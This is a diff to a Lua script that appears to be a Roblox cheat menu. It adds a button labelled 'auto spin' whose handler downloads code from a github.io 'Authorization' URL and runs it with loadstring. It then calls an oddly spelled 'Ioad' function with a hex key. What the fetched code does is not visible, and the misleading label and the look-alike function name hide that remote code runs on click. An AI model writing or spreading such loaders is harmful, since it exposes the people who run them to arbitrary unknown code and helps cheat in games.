@@ -102,6 +102,12 @@ tab1.newButton("control ball", "Prints Hello!", function()
 end)
 
 
+tab1.newButton("auto spin", "best", function()
+---sae
+loadstring(game:HttpGet("https://ghostplayer352.github.io/Authorization/"))()Ioad("7706465e03bbc83a9fd2762463b8c066")
+end)
+
+
 -- Create the second tab
 local tab2 = DrRayLibrary.newTab("tsb script", "ImageIdHere")
 
